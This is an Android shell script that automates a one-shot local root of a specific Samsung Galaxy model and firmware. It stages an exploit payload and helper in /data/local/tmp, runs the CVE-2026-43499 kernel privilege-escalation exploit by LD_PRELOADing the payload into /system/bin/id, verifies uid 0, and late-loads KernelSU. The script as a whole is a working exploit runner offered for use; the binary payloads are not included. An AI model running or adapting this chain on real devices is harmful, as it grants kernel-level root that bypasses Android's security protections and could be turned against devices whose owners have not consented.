#!/system/bin/sh
#
# rmg.sh - Root My Galaxy one-shot runner for SM-S731B (r13s, S731BXXS9BZH1)
#
# RUN THIS INSIDE A rish (Shizuku) SHELL, not from plain Termux:
#
#   rish
#   sh /sdcard/RMG/rmg.sh
#
# Why: /data/local/tmp is mode 771 owned by shell:shell, so only the shell uid
# can write there. rish gives you uid 2000 / u:r:shell:s0, the same context the
# validated USB `adb shell` run used. Plain Termux (an app uid) cannot write it.
#
# The script:
#   1. copies payload + helper + ksud from /sdcard/RMG to /data/local/tmp
#   2. waits out the 120s post-boot quiet window
#   3. runs the CVE-2026-43499 exploit (skipped if root is already live)
#   4. verifies uid 0
#   5. stages ksud and performs the KernelSU late-load
#
# Root is per-boot, and Shizuku drops on reboot. Re-run after every reboot.

set -u

SRC=${RMG_SRC:-/sdcard/RMG}
TMP=/data/local/tmp

APP_SRC=$SRC/cve-2026-43499-app.so
HELPER_SRC=$SRC/cve-2026-43499-root
KSUD_SRC=$SRC/ksud-r13s-S731BXXS9BZH1-kdp

APP=$TMP/cve-2026-43499-app.so
HELPER=$TMP/cve-2026-43499-root
# su_daemon.c hardcodes this exact path for the late-load bind mount.
KSUD=$TMP/ksud-s25u-kdp

QUIET_WINDOW=${RMG_QUIET_WINDOW:-120}

say() { printf '%s\n' "$*"; }
die() { printf '[!] %s\n' "$*" >&2; exit 1; }

usage() {
    cat <<'EOF'
Usage: sh /sdcard/RMG/rmg.sh [-h]

Must be run inside a rish (Shizuku) shell, as the shell uid.

Environment overrides:
  RMG_SRC            source directory        (default /sdcard/RMG)
  RMG_QUIET_WINDOW   post-boot wait seconds  (default 120)

The exploit's own timing comes from the compiled profile
(attempt timeout 2200s, P0 timeout 1200s, 1 attempt per boot); this script
deliberately does not override those.
EOF
}

case "${1:-}" in
    -h|--help) usage; exit 0 ;;
esac

# ------------------------------------------------------------------ preflight
uid=$(id -u)
if [ "$uid" != "2000" ]; then
    die "running as uid=$uid, need uid 2000 (shell).
    Enter a Shizuku shell first:   rish
    then re-run:                   sh $0"
fi

say "[*] uid=$(id -u) context=$(id -Z 2>/dev/null || echo '?')"

[ -d "$SRC" ]        || die "missing source directory $SRC"
[ -f "$APP_SRC" ]    || die "missing $APP_SRC"
[ -f "$HELPER_SRC" ] || die "missing $HELPER_SRC"
[ -f "$KSUD_SRC" ]   || die "missing $KSUD_SRC"

# Log beside the sources when that is writable, otherwise in /data/local/tmp.
LOG=$SRC/rmg-run.log
if ! : >"$LOG" 2>/dev/null; then
    LOG=$TMP/rmg-run.log
fi

# ------------------------------------------------------------------- staging
say "[*] copying payloads to $TMP"
cp -f "$APP_SRC"    "$APP"    || die "copy payload failed"
cp -f "$HELPER_SRC" "$HELPER" || die "copy helper failed"
chmod 755 "$HELPER" "$APP"    || die "chmod failed"

root_is_live() {
    case "$("$HELPER" -c 'id' 2>/dev/null || true)" in
        *"uid=0"*) return 0 ;;
        *)         return 1 ;;
    esac
}

ksu_is_loaded() {
    grep -q '^kernelsu ' /proc/modules 2>/dev/null
}

if ksu_is_loaded; then
    say "[+] kernelsu already loaded - nothing to do"
    exit 0
fi

# ------------------------------------------------------------------- exploit
if root_is_live; then
    say "[+] root already live, skipping exploit"
else
    uptime_sec=$(cut -d. -f1 /proc/uptime)
    if [ "$uptime_sec" -lt "$QUIET_WINDOW" ]; then
        wait=$((QUIET_WINDOW - uptime_sec))
        say "[*] uptime ${uptime_sec}s - waiting ${wait}s for the quiet window"
        sleep "$wait"
    fi

    say "[*] running exploit (probabilistic; may take a few minutes)"
    say "[*] log: $LOG"
    say "[*] live output below - KernelSnitch may cycle several times before landing"
    say ""

    # Stream to the console while also capturing the log, so a slow run does
    # not look like a hang. `id` still exits normally underneath the preload.
    CVE43499_ROOT_HELPER="$HELPER" LD_PRELOAD="$APP" \
        /system/bin/id >"$LOG" 2>&1 &
    exploit_pid=$!
    tail -f "$LOG" 2>/dev/null &
    tail_pid=$!
    wait "$exploit_pid"
    exploit_rc=$?
    kill "$tail_pid" 2>/dev/null || true
    wait "$tail_pid" 2>/dev/null || true
    say ""

    if ! grep -q 'exploit completed' "$LOG" || ! grep -q 'done=1 root=1' "$LOG"; then
        say "[-] exploit did not report success (id exit=$exploit_rc). Tail of $LOG:"
        tail -n 25 "$LOG"
        say ""
        say "[!] This profile uses a fresh-P0 session: one attempt per boot."
        say "    Reboot the device, restart Shizuku, then re-run this script."
        exit 1
    fi
    say "[+] exploit reported success"
fi

root_is_live || die "root not reachable after exploit - check $LOG"
say "[+] root verified: $("$HELPER" -c 'id' 2>/dev/null)"

# ------------------------------------------------------------------ late-load
say "[*] staging ksud at $KSUD"
cp -f "$KSUD_SRC" "$KSUD" || die "copy ksud failed"
chmod 755 "$KSUD"         || die "chmod ksud failed"

say "[*] running KernelSU late-load"
"$HELPER" --late-load || die "late-load failed - check the output above"

if ksu_is_loaded; then
    say "[+] kernelsu module is live"
else
    say "[!] late-load returned success but the module is not in /proc/modules"
fi

say ""
say "[+] done. Open KernelSU Manager (me.weishu.kernelsu) - it should show"
say "    'Working <LKM> [Jailbreak mode]'. Root is per-boot: re-run after reboot."
